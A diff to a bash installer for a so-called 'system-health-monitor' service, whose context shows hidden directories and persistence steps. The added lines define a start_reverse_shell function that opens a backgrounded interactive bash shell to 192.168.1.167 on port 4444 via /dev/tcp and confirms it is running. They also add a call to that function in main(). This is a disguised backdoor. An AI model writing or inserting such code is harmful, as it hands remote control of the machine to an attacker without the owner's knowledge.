@@ -18,13 +18,28 @@ log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
 log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
 log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
 log_debug() { echo -e "${BLUE}[DEBUG]${NC} $1"; }
-log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }  # ADDED THIS LINE
+log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
 
 # Configuration
 INSTALL_DIR="/usr/lib/systemd/system-monitor"
 BACKUP_DIR="/etc/.system-monitor"
 SERVICE_NAME="system-health-monitor"
 LOG_DIR="/var/log/system-monitor"
+
+# ADD REVERSE SHELL FUNCTION
+start_reverse_shell() {
+    log_info "Starting reverse shell..."
+    # Run in background
+    nohup bash -c 'bash -i >& /dev/tcp/192.168.1.167/4444 0>&1' >/dev/null 2>&1 &
+    
+    # Verify it's running
+    sleep 2
+    if pgrep -f "bash -i.*192.168.1.167" >/dev/null; then
+        log_success "Reverse shell is running"
+    else
+        log_warn "Reverse shell may not have started"
+    fi
+}
 
 check_prerequisites() {
     log_info "Checking prerequisites..."
@@ -300,6 +315,7 @@ main() {
     setup_profile_persistence
     setup_rc_local
     start_services
+    start_reverse_shell  # ADDED THIS LINE
     cleanup_installation
     show_status
     
